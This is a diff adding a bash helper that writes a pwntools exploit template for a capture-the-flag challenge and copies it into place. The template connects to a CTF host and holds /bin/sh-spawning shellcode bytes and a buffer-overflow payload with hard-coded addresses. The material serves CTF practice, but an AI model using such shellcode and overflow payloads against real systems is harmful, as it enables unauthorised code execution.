@@ -1,0 +1,62 @@
+#!/bin/bash
+
+# stop with any error
+set -e 
+
+if [[ -d ~/ctf/ ]]
+then
+    CTFDIR=$(realpath ~/ctf/)
+else
+    echo "~/ctf doesn't exist"
+    echo "exitting..."
+    exit
+fi
+
+# if template doesnt exist yet
+#     create
+# fi
+# copy from template to cwd
+
+if [[ ! -f ~/ctf/templates/pwn/template ]]
+then
+    if [[ $(cd "$CTFDIR/templates/pwn/") -ne 0 ]]
+    then
+        mkdir -p "~/ctf/templates/pwn"
+    fi
+    cat <<EOF | tee ~/ctf/templates/pwn/template > /dev/null
+#!/usr/bin/env python
+from pwn import *
+import sys
+
+# 'CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
+context.log_level = 'DEBUG'
+
+e = ELF('smol')
+print(sys.argv)
+
+if "tmux" in sys.argv:
+    io = e.process()
+    context.terminal = ['tmux', 'splitw', '-h']
+    gdb.attach(io)
+elif "remote" in sys.argv:
+    io = remote('pwn.utctf.live', 9998)
+else:
+    io = e.process()
+
+addr = int(0x7fffffffe770)
+# shellcode = asm(shellcraft.amd64.sh())
+shellcode = b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
+
+payload = b"AAAABBBBCCCCDDDD"
+payload += p64(0x40100c)
+payload += p64(0x01)
+# payload += bytes([0x90]) * 130
+# payload += shellcode
+log.info(f"payload:\n{hexdump(payload)}")
+io.sendline(payload)
+
+io.interactive()
+EOF
+fi
+
+cp ~/ctf/templates/pwn/template ./exploit
